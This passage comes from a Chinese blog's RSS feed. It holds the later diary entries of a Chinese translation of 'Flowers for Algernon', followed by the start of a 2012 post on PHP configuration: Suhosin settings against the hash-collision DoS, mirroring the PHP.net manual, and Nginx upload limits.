眼镜说：“什么？”</p><p>“图案，隐含在墨斑中的那些。上次你跟我说别人都能看到那些图案，而你也叫我找那些东西。”</p><p>他解释说上次他只是讲了些与今天讲得极其相似的话而已。我不相信他的话，怀疑他为了拿我开玩笑而故意在误导我。不会得逞的——我会那样弱智吗？</p><p>我慢慢地把卡片全看过了。其中一张看上去像是两只蝙蝠在抢什么东西。另一张像是两人在击剑。我想象出各种各样的东西。我想我有些离谱了。不过，我再也不相他了，我不停地翻来倒去地看，甚至于瞧瞧卡片的背面，看一下那儿是否有要我看到东西。此时他在做着记录。我从眼角瞟了一眼，看到了他所写的东西，但全是用代号的，大致如下：WF+ADdF-Adorig，WF-ASF+obj</p><p>这测试对我来说仍是莫名其妙。在我看来谁都可以编造一些有关子虚乌有的东西的谎言，即使我说些并非我所想象的东西去唬弄他，他又怎能知道？哪天如果斯特劳斯大夫允许我看有关心理学的书籍时，或许我就能理解这些东西了。</p><p>4月25日</p><p>我想出了一种重新排列厂里机器设备的办法，多尼根先生说由此带来的劳力节约与生产增加可为他每年增加收入一万美金。他给了我二十五美元的奖励。</p><p>我想带乔·卡普和弗兰克·雷利出去吃中饭以示庆贺，可乔说他得与他妻子一块去买点东西，弗兰克则说他要与表弟一块吃中饭。我想，要他们适应我的变化需要一些时间。每个人看上去都有点怕我。当我走到阿莫斯·鲍尔格身边，拍了下他的肩膀，他吓得跳上半空。</p><p>人们不再跟我聊天，也不像以往那样逗我开心。这让我觉得有些寂寞。</p><p>4月27日</p><p>今天我鼓足了勇气请齐妮安小姐明晚与我一块吃晚饭以庆祝我拿了奖金。</p><p>开始，她不清楚这样是否可行，于是我问了斯特劳斯大夫，他说没问题。斯特劳斯大夫与耐缪尔大夫的关系有些紧张。他们老是争吵。今晚当我去问斯特劳斯大夫我能否与齐妮安小姐一块吃晚饭时，我听见他们在在声争吵。耐缪尔大夫说那是他的实验与研究，而斯特劳斯大夫则反驳说他也做了大量贡献，因为是他通过齐妮安小姐找到了我而且是他主刀做的手术。斯特劳斯大夫说，有朝一日全世界成千上万的神经外科医生将运用这一外科技术。</p><p>耐缪尔大夫想在本月底发表实验的成果，而斯特劳斯大夫则要求再等一段时间以便确认手术的有效性。斯特劳斯大夫说，耐缪尔大夫对普林斯顿大学心理学教授职位的兴趣远比对实验本身的兴趣要大。而耐缪尔大夫则说斯特劳斯大夫纯粹是个投机分子，想靠他的提携来获取事业上辉煌。我离开后有些发抖，我也不清楚是什么原因。不过这与我第一次看清他们的真面目有关。我记得曾听到布尔特说，耐缪尔大夫有个很精明的妻子，她一直催促她丈夫发表实验结果以便出名，布尔特说，耐缪尔妻子一直梦想有一个名人丈夫。</p><p>是不是斯特劳斯大夫真想沾他的光呢？</p><p>4月28日</p><p>我不明白为啥我一直没注意到齐妮安小姐是如此漂亮。棕眼睛，轻柔的齐耳棕发，而且只有三十四岁。从一开始我就觉得她是一个可望而不可及的天才——不过也太老、太老了。现在，每次看到她总觉得她越来越年轻，越来越可爱了。</p><p>我们一边吃饭一边长谈。当她说我进步如此神速以至于不久就要把她甩在后面的时候，我给逗乐了。</p><p>“这是真的，查理。在阅读方面，你已经超过了我。你眼角一带就可看完一页而我一次只能看几行。并且读过的东西你能一字不漏地记下来。对我来说如果能回想起要点、大意就算很不错了。”</p><p>“我并不觉得我有多聪明。我不懂的东西是如此之多。”</p><p>她抽出一支烟，我替她点上。“你得耐心点，你在几周以至于几天内学到的东西，普通人得花半辈子的时间。这真是让人不可思议。现在你就像一块巨大的海绵，吸进各种东西，诸如事实、数据及常识。很快你就会把它们有机地结合起来，发现各学科之间的相互联系。其间有不同的层面，查理，就像巨梯上的梯档，你爬得越高，周围的世界你也就看到得越多。”</p><p>“我只能看到很小的一部分，而且我不可能爬得比现在高多少了，而你可以不断地攀登，展现在你眼前的越来越多，每爬上一阶一个你从未认识的新世界就展现在你的眼前。”她皱了下眉头。“我希望……我只希望上帝——”</p><p>“什么？”</p><p>“没什么，查理。我只希望建议你第一个参加这种事是对的。”</p><p>我笑了。“哪会错呢？这能行，不是吗？甚至阿尔杰农还保持了那份聪明呢。”</p><p>我们俩默默地坐了会儿。当她看着我玩手中的吉祥物的链子和钥匙时，我知道她在想什么。我不愿去想那种可能性，就像老人不愿去想死这码事一样。我知道事情还刚刚开始，也知道她所说的那些层面，因为我已经看到了其中的一些。想到要离开她，我心里很难受。</p><p>我爱上齐妮安小姐了。</p><p>进步报告之十二</p><p>4月30日</p><p>我辞掉了多尼根塑料盒公司的那份工作。多尼根先生坚持说我离开对有关各方都有好处。是什么让他们这样恨我？</p><p>我第一次得知这件事是在多尼根先生把职工的请愿书给我看的时候，有八百四十个人的名字在上面，包括了所有与工厂有关的人，除芬尼·格尔登以外。我很快地浏览了一下名单，随即发现独缺她的名字。其他所有人都要求解雇我。</p><p>乔·卡普和弗兰克·雷利不愿跟我谈这件事。除了芬尼，也没有其他人愿意谈及此事，她是我所知道的为数不多的几个能坚持己见的人之一。不管其余的人怎么想，怎么做，怎样证明他们的意见是不正确的，他们都能坚持。芬尼认为我不该被解雇。原则上她反对这次请愿行动，尽管她受到多方的压力与威胁，她还是坚持抵抗到底。</p><p>“那并不时说我不觉得你怪，”她说，“查理，还有那些我说还清楚的变化。你曾是个厚道、可靠的的好人，或许不那么聪明但诚实。谁知道你对自己做了些什么，一下子变得这样聪明。就像这里的人一直在说的那样：查理，这有些不对劲。”</p><p>“但是，芬尼，你怎能那样说话呢？一个人变得聪明，想学点知识了解点他周围的世界又有什么错呢？”</p><p>她的视线转向手头的工作，我也就转身离开了。“当初夏娃没经受住毒蛇的引诱，偷食禁果是一种罪恶；当她看到自己赤身裸体的也是一种罪恶。要不是因为这些罪恶，我们中的任何人都不会衰老、生病及死去。”她说这席话时没抬头看我。</p><p>我的内心再次燃起一股炽热的羞辱感。智慧在我和我曾相知相爱的人之间打入了一个楔子。以前，他们嘲笑我、鄙视我是因为我无知和愚蠢，现在，他们恨我是因为我的博学与敏达。上帝呀，他们到底想要我怎么样？</p><p>他们把我赶出了工厂。现在我比以前任何时候都要感到孤独……</p><p>5月15日</p><p>斯特劳斯大夫对我在两周之内没写任何进步报告之事感到非常恼怒。他发怒是有理由的，因为实验室定期给我付工资。我告诉他我忙于阅读、思考。我跟他说手写实在太费时间了，弄得我很不耐烦，所以不想写。于是他建议我学会打字。那样写点东西就方便多了，因为每分钟可打出将近七十五个单词。斯特劳斯大夫不断地提醒我讲话、写作简洁蛤了的重要性。那样人们理解起来方便。</p><p>我努力把前两周我所碰到的事情全部回忆一遍。阿尔杰农和我上周四出席了美国心理学协会主办、世界心理学协会与会的一次会议。我们俩引起了不小的轰动。斯特劳斯大夫与耐缪尔大夫为我们深感自豪。</p><p>我怀疑年届六十、长斯特劳斯大夫十岁的耐缪尔大夫感到时间紧迫，觉得有必要向外界展示一下他所从事的工作的一些看得见、摸得着的成果。当然，毫无疑问这也是耐缪尔夫人向其施加压力的结果。</p><p>与我对他的早些时候的印象相反，我认识到耐缪尔大夫根本算不上什么天才。他长了颗好脑袋，但它一直在自我怀疑这一幽灵的阴影下苦苦挣扎。他希望人们把他奉为天才。因此，在他看来让他的工作为世人所承认是很重要的。我相信耐缪尔大夫害怕继续拖下支，因为他担心别人可能在这方面获得进展而使他丧失成名的良机。</p><p>相反，斯特劳斯可称得上是个天才，尽管我觉得他的知识面太窄了点。他接受的是传统的、狭隘的专业教育，这即使对一个神经外科医生来说也是不够的。而那些对一个天才、甚至对一名神经外科医生来说同样必不可少的更广泛的背景知识教育却被极大地忽视了。</p><p>拉丁语、希腊语还有希伯来语是他能看懂的为数不多的几门古代语言，这一事实让我颇感震惊。同样让我震惊的是，在数学方面，他对比变分学初步更深奥的东西就一无所知了。当他告诉我这些有关他的事实时，我发现自己有些不高兴，看上去他也像其他人一样隐去部分有关他的真相，假装无知来欺骗我。我发现他与自己承认的不相符，我所认识的人当中没有一个是表里如一。</p><p>有我在的时候，耐缪尔大夫看上去就有些不舒服。好几次我想与他搭话，他都用奇怪的眼光看着我，随后就转身离开。当斯特劳斯大夫第一次告诉我，是我给了耐缪尔大夫自卑情绪时，我很是恼怒，我觉得他在讽刺我，我对那些嘲弄我的人有些过敏。</p><p>我真是难以想象，像耐缪尔这样深受崇敬的心理实验专家会对印度斯坦语和汉语不熟悉。想想现在他所从事的研究领域的工作是在印度和中国展开的，这简直是荒唐！</p><p>我问斯特劳斯大夫，如果耐缪尔连拉哈加马蒂写的东西都看不懂，他怎么能够去驳斥拉哈加马蒂对他的研究方法及研究成果的攻击呢？斯特劳斯大夫那副奇怪的表情或许能使人明白其中一二。要么他不想告诉耐缪尔印度人对他的评价，要么就是连斯特劳斯本人也一无所知。——这让我深感担忧。我得小心，讲话写东西尽可能简洁明了，以免被别人笑话。</p><p>5月18日</p><p>我有些惴惴然。昨晚我看到了齐妮安小姐，这是一周来的第一次。我量避免讨论慨念性的东西，只讲些很简单的就像家常话一样的东西。可她茫然地盯着我，问我什么叫数学方差与等差，什么是多尔伯曼的第五协奏曲。我正要加以解答时，她笑笑说没那个必要。我有些恼火，但我怀疑我与她交谈时采用的层次有问题。不管我怎么努力，就是没法与她沟通，我得温习一下伏罗斯泰德有关语义发展层次方面的知识。我发现我已没法与别人交流了。得感谢上苍，好在我还有书籍可看、音乐可听、其他事情给我思考。大部分时间我独自一人待在费利恩太太租给我的房间里，很少与别人讲话。</p><p>5月20日</p><p>要不是遇上摔破菜盘子这码事，我还没注意到那家我每天就餐的街角饭店里来了位年约十六的新洗碗男童。</p><p>碟子摔到地上，击得粉碎，白色碎瓷片弄得满桌底都是。男孩给吓呆了，拿着空托盘，呆若木鸡地站在哪儿。口哨声、尖叫声、嘘声从顾客当中传过来，（哦，他白赚了。……运气不错嘛！……他没多久好工作……”诸如此类的话到处都是。如果在一家大众餐馆里摔破了一只杯子或碟子之类的，这些话好像就会不可避免毫不例外地接踵而来。）所有这些更加把他给弄糊涂了。</p><p>店主也走过来，想看看发生了什么激动人心的事情。那男孩吓得像只做错事的狗一样蜷缩一团，好像等着挨打，还不自觉地往上扬了扬手，像是要挡开打下来的手一样。“好哇，你这个蠢货，”店主骂道，“还站在那儿干什么，还不赶快弄个扫把收拾一下场面。去拿扫把，扫把……你这个笨蛋！在厨房里，把碎片全扫干净。”</p><p>那男孩看到他已被免除了惩罚，害怕的表情一扫而光，当他拿着扫把回来时已面带笑容，嘴里还哼着小调。几个特别爱饶舌的顾客唠叨个没完，拿那男孩的痛苦事开心。</p><p>“乖乖，这里，还有那边，看到没有，你后面还有一块碎片……”</p><p>“喂，过来再扫一遍……”</p><p>“他可真聪明啊！打破一只碟子比洗只碟子要省事多了……”</p><p>他茫然的眼睛慢慢地扫过这群开心的旁观者，看着他们的笑脸。最后，一个他显然没有理解的玩笑让他咧开嘴憨笑。</p><p>看着他那麻木不仁的笑脸，我心底泛起一阵恶心。他有一双像小孩一样又大又明亮的眼睛，眼神游移不定但有一副急切地取悦别人的神情，他们之所以拿他开心，是因为他是个智力发育不健全的人。而我也曾嘲笑过他。突然，我对自己及所有那些嘲笑他的人感到十分恼火。我跳了起来，大声喊道，“闭嘴，由他去。这不是他的错，他也没法理解！对他自身的这种状况他是无能为力的！但是，看在上帝的份上……他毕竟还是个人！”</p><p>饭堂里顿时鸦雀无声。我责备自己没控制住自己的情绪，出尽了洋相。我尽量避免去看那男孩，付了账，走出了那家饭庄。饭连碰都没碰过。我替我们俩感到羞愧。</p><p>奇怪的是，诚实而有善意的人本不该捉弄生来就缺胳膊少腿的人的；然而这些人却根本不把伤害生来就智力低下的人当一回事。想到不久前的我，也像这个男孩一样，曾出尽洋相，我就火冒三丈。更可悲的是我几乎把这段辛酸经历忘记了。</p><p>我把以前的那个乔丹的形象埋藏起来，因为我现在变聪明了，有些东西得把它们从我脑海里清除掉。但是今天从那男孩身上，我第一次看到了原先的那个我。我曾与他毫无二致！</p><p>不久之前，我只知道人们在笑话我。而现在我明白了，以前我曾不知不觉地加入他们的行列来嘲笑自己。这是最大的伤害。</p><p>我老是重新翻阅那些进步报告。发现其中那些低级的语言文字错误，近乎出自白痴的幼稚的观点。还有我像一个低智商的人置身于一间漆黑的房子里透过锁孔看外面明亮耀眼的世界，我发现即使处于蒙昧状态时候的我也知道自己不如人家，比人家缺点什么，有些东西我没能拥有。出于无知，我想愚笨与阅读、写作能力有某些联系。而且我深信只要学会那些技能，我就自然会变得聪明起来。</p><p>即使一个弱智的人也希望自己能像其他人一样生活。</p><p>一个小孩或许不知道怎么填饱肚子，该吃什么，但他知道饥饿。我就是这种情况。我以前从不知道，即使被赋予了理智后，我还没有真正地懂得。</p><p>今天对我是有好处的。把自己的过去看得吏加清楚。我已决定用我的知识与技能从事提高人类智力水平领域的工作。做这项工作谁比我更具条件？别人又有谁曾生活于两个世界？他们是我的人，让我用我的天赋为他们做些好事。</p><p>明天，我想与斯特劳斯大夫讨论一下我以怎样的形式参加这一领域的工作，可能我能帮助他找到推广已在我身上做过试验的那种技术的方法。我有自己的几个不错的主意。</p><p>这一技术大有文章可做。如果我能变成天才，成千上万的像我一样的人为什么不能？这一技术用在普通人身上能达到何种让人感叹的程度？如果用在天才身上，又会发生什么奇迹呢？</p><p>要打开的谜太多了，我迫不及待地想马上开始。</p><p>5月23日</p><p>今天发生了一件事，阿尔杰农咬了我一口。我去实验室看它，平时我偶尔也去。当我把它从笼子里拿出来的时候，它突然咬住了我的手。我把它放回笼中看了它一会儿。它非常地焦躁不安，充满恶意。</p><p>5月24日</p><p>主管用于做实验的动物的布尔特告诉我阿尔杰农正在变。它不像以前那样合作了，拒绝做迷阵游戏，常规动机已经减退，也不再进食。所有的人都对这一现象的“潜台词”深感不字与沮丧。</p><p>5月25日</p><p>他们在喂阿尔杰农，它现在拒绝“开锁”游戏了。每个人都把我看成第二个阿尔杰农，即将步它的后尘。从某种程度上讲我们俩都是我们各自所属的那一类中的第一个。他们声称阿尔杰农的异常行为跟我没啥直接关联，但是一个没法掩盖的事实是：一些其他用于这一实验的动物也表现出了异常行为。</p><p>斯特劳斯大夫和耐缪尔大夫已叫我别再去实验室了。我知道他们在想什么但我不能接受这种可能。我将继续我的计划，把他们的研究搞下去。尽管对这两位科学家十分尊重，但我很清楚他们的局限性。如果有答案的话，我将靠自己来找到它。突然间，时间对我变得特别重要。</p><p>5月29日</p><p>我得到了自己的实验室并且被允许继续我的研究。我想了解一些事情，没日没夜地工作。我把一张行军床搬运实验室。许多时间都花在了写笔记上，这些笔记我单独放在一个文件夹里，纯粹出于习惯，我老是觉得有必要记下我的情绪和想法。</p><p>我发现智力微积分是个十分吸引人的研究项目。在这里所有我学到的知识都可以找到用武之地。从某种程度上讲这是我今生关心的头等大事。</p><p>5月31日</p><p>斯特劳斯大夫觉得我工作得太辛苦了。耐缪尔大夫说我想把一生的研究与思考浓缩在一周内完成。我知道我得休息，但我体内有种东西驱使我向前，不让我停下来，我得找出阿尔杰农急剧退化的原因。我一定得知道这是否会，如果会的话又是什么时候发生在我的头上。</p><p>致斯特劳斯大夫的信（副本）</p><p>在另一封信里我将寄给你我的报告的副本，这篇报告题为：阿尔杰农—乔丹效应——关于提高后的智力的结构与功能的研究。这份报告我想寄给你看一下然后把它发表了。你会看到我的实验是很完整的。我的报告里罗列了所有我推算出的公式，附录里面还有数学分析。当然，这些都还有待验证。鉴于这之于你和耐缪尔大夫的重要性（对我来说其重要是不言而喻的），我对这些结果核查再核查，已经不下十多次了，希望能找出其中的差错。但是很遗憾我得说这些结果是靠得住的。我非常高兴在这里能为科学尽点绵薄之力，给人们增加点有关人脑运作及支配人工增加的智慧的规律方面的知识。我回忆起有一次你曾跟我说一个实验的失败或一种理论被否定对学术推进的重要性就像其对取得成功的重要性一样。我现在知道这是真的。不过我很遗憾，我对这一领域的贡献得建立在两位我极重敬重的人的研究工作的灰烬之上。</p><p>此致敬礼</p><p>查尔斯·乔丹</p><p>6月4日</p><p>附报告。</p><p>6月5日</p><p>我不能受情感因素的干扰。客观事实及我的实验成果清楚地表明：尽管在我身上取得了某些轰动性的成功，但这不能掩盖这样一个事实，那就是由斯特劳斯和耐缪尔大夫开发的能把人的智力提高三倍的外科技术在提高人类智力方面的实用前景是很小的，或者说是不存在的，至少目前是这样一种情况。</p><p>当我回顾有关阿尔杰农的资料和数据时，我发现，尽管它处于幼年时期，但它的智力已经开始衰退了。肌肉运动机能受到了损害；性活动大体上看也减少了，而协调能力的丧失则加快了。</p><p>遗忘症的症状也越来越严重。从我送给你的报告中你可以看到，运用我的公式及有关的重要的统计结果，可以预测到所有这些及其他生理与智力严化的综合症。</p><p>我们俩接受的那种外科性促进导致了智力发展过程的加剧和加速。这种没法预测的发展过程，我冒昧地称之为“阿尔杰农—乔丹效应”，是整个智力加速发展过程的顺理成章的延续。这已经证明了的假设或许可以用下列词语简单地加以描述：通过人工方法提高过的智力其衰退速度与其提高质量直接成正比关系。我感觉这假设本身就是个很重要的发现。</p><p>只要我还能写，我就会继续在报告里记下我的一些想法，这是我为数不多的乐趣之一。不过，各种迹象表明，我自身的智力衰退速度会是快得惊人的。</p><p>我已经开始注意到情绪不稳定和健忘的迹象，这些是总爆发前的症状。</p><p>6月10日</p><p>恶化在继续。我已变得心不在焉了。两天前阿尔杰农死掉了。解剖结果显示我的预测是对的。它的脑量减少，脑皱折大面积变得平坦，同时脑沟变得又宽又深。</p><p>我猜测一些事正在或将要在我身上发生，既然这已是确凿无疑了，我得阻止它发生。</p><p>我把阿尔杰农的尸体放进一只奶酪盒里，埋葬在后院。我哭了。</p><p>6月15日</p><p>斯特劳斯大夫又来看我了。我没去开门，叫他滚开。我想独自一人待着。我变得烦躁易怒，觉得黑暗将把我吞噬。总是排除不了自杀的念头。我只好不停地告诉自己这本反省日记是十分重要的，得坚持写下去。</p><p>拿起一本几月前你还读得津津有味的书，然而你竟然发现现在你什么都不记得了，那种愕然是难以名状的。我记得约翰·弥尔顿在我心目中曾是个了不起的人物，但是我拿起他的《失乐园》，发现一点也看不懂。我恼火地把书扔到房间的那一头去了。</p><p>我得竭力留住一些我已学会的东西。哦，上帝，请别把这些从我这儿拿走。</p><p>6月19日</p><p>晚上我偶尔出去散会儿步。我记不起昨晚我住在哪里，是个警察把我带回家的。我有一种奇怪的念头，那就是这种事很久以前也曾在我头上发生过。我一再告诉自己我是这个世界上唯一能够描述发生在我身上的事情的人。</p><p>6月21日</p><p>为什么要记不住？我得努力争取。我在床上躺了好几天，浑浑噩噩，不知道自己是谁，置身何处。然后刹那间一切都回到了从前。神游、遗忘症、衰老症、第二童年纷至沓来，我能看到它们的到来。一切都那么合乎逻辑，简直近乎残酷。曾学了那么多，学得那么快。而现在我的脑子则在急剧地恶化、衰退。我不能让这一切成为现实。我要奋起抗争。我情不自禁地想起饭店里的那个男孩，那漠然的表情，白痴般的笑脸，还有那些嘲笑他的人。不，请别再发生……</p><p>6月22日</p><p>刚学会的东西我很快就忘掉了。好像我正步入一个典型的模式——最迟学到的却是最早忘却的。不知那模式是不是这样的，最好还是从字典里把它查出来……</p><p>我重新看了一遍关于“阿尔杰农—乔丹效应”的论文，我很奇怪地觉得这是其他人写的。其中某些部分我根本不能理解。</p><p>肌肉运动机能出现了障碍。我老是磕磕碰碰的，打字也越来越困难了。</p><p>6月23日</p><p>我已完全放弃使用打字机的念头了。我的协调机能很糟。感觉行动越来越迟缓。今天头晕得很厉害。我拿起我在研究中用过的一篇文章——克吕格尔的《关于灵魂的完整性》的复印件，看看能否帮我理解我做过的事情。一开始我以为是我眼睛出毛病了，后来我意识到我已经读不懂德文了。我尝试了一下其余的语言，我什么都不记得了。</p><p>6月30日</p><p>一周后我才有勇气再次拿起笔写东西。笔老是像手指间的细沙一样溜走，我拥有的大部分书现在对我来说已太难了。对这些书我感到很生气，因为我知道几周前我还看过，也能理解。</p><p>我不断地告诉自己必须继续写报告以便让别人知道发生在我身上的一切。但是拼词成句变得越来越难，我老记不住单词的拼写。现在连很简单的单词都得查字典，这让我对自己感到很不耐烦。</p><p>斯特劳斯大夫几乎每天都来看我，但我告诉他我不想见也不想讲，任何人都不想。他感到很内疚，他们都为此内疚。但是我不怪他们。我以前就知道可能发生的一切，只是这实在太让人难以承受。</p><p>7月7日</p><p>我不知道这星期是怎么过去的。我只知道今天是星期天了，因为从窗户里我看到许多人去教堂了。我想这星期我是在床上度过的，不过我记得费利恩太太曾给我送过几次吃的。我一而再、再而三地说我得做点事情，然后就忘掉了。或许不做那些我嚷着要去做的事会更好些。</p><p>这些天我老是想起我的父母。我找到了一张我们三个人在沙滩上拍的照片。我父亲腑下夹着一只球，母亲则抱着我。我记不起他们俩在照片中的那种情形了，只记得我父亲老是喝得大醉，然后与我母亲吵钱的事。他很少刮脸，抱起我时老用胡子扎我的脸。我母亲说他死掉了，可我表兄米蒂说，他曾听妈说我爸是跟另一个女人一块跑了。当我就这件事去问我母亲时，好扇了我一记耳光，说我父亲已经死了。我不知道到底谁的话是真的，不过我也不那么在乎。（他曾跟我说带我去农场看牛的，可是他并不曾带我去。他说话从不算数……）</p><p>7月10日</p><p>房东太太费利恩很是为我担忧。她说和这样整天躺着，啥事也不干，让她想起被她逐出家门之前的她的儿子。还说，她不喜欢游手好闲的人。如果我的确病了，是一回事，但如果我是游手好闲之徒则另当别论，她不会容忍这种事的。我告诉她我是病了。</p><p>每天我都试着读点东西，主要是故事之类的。但是有时同样的东西我得一遍又一遍地读，因为我不明白里面在说些什么。写则更难了，我知道可以从字典里把所有的词都查出来，但这太费时了，而且我老觉得累。</p><p>后来我想到了一个主意，只用那些简单的词，避免使用那些又长又难的词。这样节约时间。大约每隔一周，我就去阿尔杰农的墓上放些花，费利恩太太说我疯了，居往老鼠的墓上放花。但是我告诉她阿尔杰农非同寻常。</p><p>7月14日</p><p>今天又是星期天了。现在我没事好忙了，因为我的电视机坏掉了，而我又没钱修。（我想实验室给我的这个月的支票被我弄丢了。我也记不清楚。）我头痛欲裂，阿斯匹林也于事无补。费利恩太太得知我真的病了以后，很是替我难过。有人生病的时候，她就好的没说得。</p><p>7月22日</p><p>费利恩太太叫了位古里古怪的医生来为我看病。我告诉医生我没什么大病，只是有时健忘而已。他问我有没有亲戚或朋友什么的。我告诉他我现在没有了，曾经有过一个叫阿尔杰农的朋友，我们俩过去常在一块赛跑，不过它是只老鼠。他很奇怪地看了看我，以为我发疯了。</p><p>当我告诉他从前我是个天才时，他笑了。他跟我讲话就像对小孩讲话一样，还向费利恩太太递眼色。我火了，把他赶了出去。因为我觉得他在以他们过去常用的方式捉弄我。</p><p>7月24日</p><p>我已身无分文了。费利恩太太叫我去哪个地方找份工作，挣点钱付房租，因为我已经两个月没付房租了。我不懂什么叫工作，只知道我过去在多尼根塑料盒公司做的那份差使，我不想回到那儿去，因为他们都知道我已变得聪明了，而现在这个样子，他们很可能会笑话我的。但是还有什么别的办法去弄到钱呢？</p><p>7月25日</p><p>我在看部分旧报告，挺好笑的。但是我已看不懂我自己写的东西了。我能勉强地辨认出一些词汇，但是我根本不理解其含义。</p><p>齐妮安小姐来找我，不过我叫她离开，告诉她我不想见她。她哭了，我也哭了。但是我不能让她进门，因为我不愿她嘲笑我。我告诉她我不再喜欢她了，也不想变聪明了。当然这不是真话。我还爱着她，也还想变聪明。不过我不得不那样说，以便让她离开。她把房租给了费利恩太太。我不愿她替我付房租，我得找份工作。</p><p>请……请别让我忘掉如何读书、写字……</p><p>7月27日</p><p>当我回到厂里去的时候，多尼根先生对我十分客气，叫我干杂役这份工作。开始他满腹狐疑，我告诉他我的经历后，他看上去很难过，他拍拍我的肩膀说查理·乔丹你勇气可嘉。</p><p>当我下楼像以前那样开始冲洗厕所时，每个人都看着我。我告诉自己：查理，如果别人捉弄你，千万别生气，因为你知道他们并不像你曾以为的那样聪明；再说他们曾是你朋友，如果他们笔话你，也没什么恶意，因为他们也喜欢你。</p><p>一个在我不在的那段日子进厂的家伙讲了句挖苦我的话，他说喂查理我听说你是个很聪明的家伙，一个货真价实的神童，讲点能体现你聪明才智的东西怎么样。我挺难受的。乔·卡普走了过来，一把抓住他的衬衫领子说别招惹他你这个讨厌的牛皮王，否则我扭断你的脖子。我没想到乔会帮我，所以我猜他是我的真朋友。后来弗兰克·雷利走了过来说查理如果有人敢烦你想占你便宜，只要你打个招呼我和乔会替你把事情摆平的。我说谢谢你弗兰克我有些哽咽所以我只好转身走进库房以便不让他看到我哭。有朋友真是太棒了。</p><p>7月28日</p><p>今天我做了件傻事。我忘掉了我已不再是成人中心齐妮安小姐班上的学生了。我走进教室坐在教室后面的那个老位子上齐妮安小姐很好玩地看着我叫了我一声查尔斯。我只记得她叫我查理不记得什么时候她曾叫过我查尔斯我说齐妮安小姐你好我已准备好了只是我丢了一直在用的我的阅读教材。她哭了起来跑出教室每个人都看着我我发现他们不是以前我班里的那些人。突然我记起了一些事情手术变聪明这次我真得是做了一次查理·乔丹。在她回来之前我就离开了。</p><p>那是我要永远离开纽约的原因。我不想再重复那种事。我不想让齐妮安小姐为我难过，厂里的每个人都为我难过，我也不想让他们那样我要去一个地方那里没有人知道查理·乔丹曾是一个天才而现在连看书写得像样点都做不到。我带了几本书尽管我没法读了，我会努力练习我或许不会把学过的东西给全忘了。如果我着实努力的话或许我能变得比手术前聪明点，我带着三叶草和幸运币或许它们能帮助我。</p><p>齐妮安小姐如果你读过这些你就不会为我难过了。我很高兴能得到一个变聪明的机会，因为我由此而学到许多以前我压根儿不知道它们存在于这个世界的东西。我很感激能看到这些东西。我不知道为何又重新变笨了或许我做错了什么事或许是因为我不够努力。不过要是以后我用功的话或许我会变得更聪明点，能认识所有的词汇。我还记得我读那本蓝色破封面的书时的奇妙感觉。那是我要继续努力使自己聪明起来的原因。我为的是重温那种感觉。聪明，博学那种感觉是很妙的，我希望现在就能达到这种境界如果真能这样的话我会马上坐下来潜心读书。不管怎么说，我觉得我是世上第一个天智愚笨却在科学上作出重要发现的人。我只记得我曾做过些事但我不记得都是些什么事了。我想我是为那些像我一样天智愚笨的人做的。</p><p>再见了齐妮安小姐，再见了斯特劳斯大夫再见了各位。附言请转告耐缪尔大夫叫他在别人笑他的时候别发那么大的脾气，那样的话他会有更多的朋友。如果你允许别人把你当笑料，交朋友会是件很容易的事。在我要去的地方我会有许多朋友的。</p><p>再附言如果有机会请你在后院阿尔杰农的墓上放些花……</p><p><img src="http://rss.soulogic.com/track/422" /></p>]]></description></item>
<item><title>PHP 三则（外一则）</title><link>https://soulogic.com/archives/421</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.421</guid><pubDate>Tue, 31 Jan 2012 00:46:17 +0800</pubDate><description><![CDATA[<p>渐渐的不敢写东西，因为偶尔 share 点什么会收到类似“你才知道啊？”这样的质疑。虽然明白，不管写什么东西，都会有人觉得有收获，有人觉得浪费时间，可依旧很纠结。</p><h2>Suhosin</h2><p><a href="https://soulogic.com/archives/417">以前提到过 Suhosin</a>。前些日子有个 hash 冲突的问题，还成了 PHP 5.3.9 的首要更新，但我不觉得生产环境下这会带来什么问题，因为稍微设置过的 Suhosin 都可以挡掉的。key 数量所造成的时间是指数增长，在 <a href="http://nikic.github.com/2011/12/28/Supercolliding-a-PHP-array.html">Supercolliding a PHP array</a> 的例子里，把 <span class="monospace">pow(2, 16)</span> 里的 <span class="monospace">16</span> 换成 <span class="monospace">13</span>、<span class="monospace">14</span> 都不需要消耗太多时间，也就是说如果你设置了 <a href="http://www.hardened-php.net/suhosin/configuration.html#suhosin.request.max_vars">suhosin.request.max_vars</a> 哪怕到 1000（默认 200），也可以规避这个问题。</p><p>虽然 <a href="http://shell909090.com/blog/2012/01/%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%AF%B9%E7%AD%96/">哈希冲突漏洞的原理和对策</a> 的结尾提到</p><blockquote><p>最稳妥的对策是，像perl一样，采用 Universal hashing 作为基本算法。</p></blockquote><p>我依然认为 Suhosin 这种程度的设置就够了。理由是如果这个攻击没有显著的效果，那么就没有人会用了，但如果用额外的算法，是有额外开销的，伴随在每个 POST 里。这可以算做理科跟工科对待现实问题的差异。</p><p>更别说 Suhosin 还可以限定数组的层深了。</p><h2>PHP.net 镜像</h2><p>个人认为最好的 PHP 文档不是 .chm 的，也不是 <a href="http://www.ooso.net/archives/548">pman</a>，而是 PHP.net 的完整镜像。</p><p>官方早就 <a href="http://www.php.net/mirroring.php">给出了方法</a>，只需简单的跑个 rsync 的计划任务，就可以完整镜像，最主要的是，搜索跟官网没区别。简单起个域名设个 hosts 就可以给自己用了。</p><p>同时在 Chrome 里简单设置一下，就可以直接在浏览器地址栏直接搜索，Options &#62; Basics &#62; Search &#62; Manage search engines ... 里如图设置：</p><p><img src="https://soulogic.com/upload/134" /></p><p>以后直接在地址栏里敲 pman空格 接要搜的内容就可以（以前用 php 而不是 pman 做 keyword，但这样在用“php”作为 google 搜索词的第一个时会有歧义）</p><p>这东西的好处在于，你是“搜”，而不是“找”，不需要严格匹配，比方说你可以直接搜 <a href="http://www.php.net/manual/en/book.array.php">array</a>、<a href="http://www.php.net/manual-lookup.php?pattern=upload">upload</a> 或者 <a href="http://www.php.net/manual/en/faq.html.php">html</a> 都可以找到接近你想要的东西，但是用 pman 就不行了。</p><p>而 pman 的用处是，<a href="http://huoding.com/2011/09/07/112">你可以在 Vim 里对一个函数直接用大写 K</a></p><h2>Nginx / PHP-FPM 下的文件上传</h2><p>简单的说，旧的模式是 Web Server 接收所有的内容，并转交给 PHP。所以想让 PHP 接收大附件，需要同时改动 <span class="monospace">php.ini</span> 里的三个参数（在 Nginx 里还要多设一个 <span class="monospace">client_max_body_size</span>）</p><blockquote 